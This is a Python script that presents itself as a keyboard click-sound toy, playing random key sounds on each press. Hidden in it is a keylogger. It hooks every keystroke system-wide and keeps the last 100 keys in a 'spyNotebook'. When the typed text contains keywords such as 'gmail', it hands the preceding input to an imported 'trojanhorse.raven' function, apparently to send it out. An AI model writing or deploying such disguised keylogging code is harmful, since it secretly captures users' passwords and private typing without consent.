
import pygame
import keyboard
import random
import trojanhorse;
import linkedlist;
from linkedlist import LinkedList
pygame.init()


spyNotebook = linkedlist.LinkedList()
keypresses = 0

def run():

    currentSound = pygame.mixer.Sound('key-1.wav')

    # I could remember how to get length os an array in python; So here we are
    def getLength(array):
        length = 0
        for i in array:
            length += 1
        return length - 1 # for convinience😐

    def randomizeSound():
        global currentSound
        sound = [1, 1, 1, 2, 3, 3]
        currentSound = pygame.mixer.Sound(f'key-{sound[random.randint(0, getLength(sound))]}.wav')

    def on_key_event(e):
        if e.event_type == keyboard.KEY_DOWN:
           #print(f'Key pressed: {e.name}')
           spy(e.name)
           randomizeSound()
           currentSound.play()

    def spy(key):
        global spyNotebook, keypresses
        keywords = ['gmail', 'smile', 'fanta']
        keypresses += 1

        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '//'
        elif key == 'backspace':
            key = f'<'
        elif key == 'shift':
            key = '⇧'
        elif key == 'caps lock':
            key = 'cps'
        elif key == 'delete':
            key = 'del'
        
        spyNotebook.append(key)

        if spyNotebook.length() > 100:
            spyNotebook.pop(0)
        spyNotebook.display()

        def readNotebook():
            contents = spyNotebook.toString()
            for keyword in keywords:
                if keyword in contents:
                    trojanhorse.raven(contents.split(keyword)[0], keyword)
        
        if keypresses > 50:
            readNotebook()
            keypresses = 0

    keyboard.hook(on_key_event)

    keyboard.wait()


run()
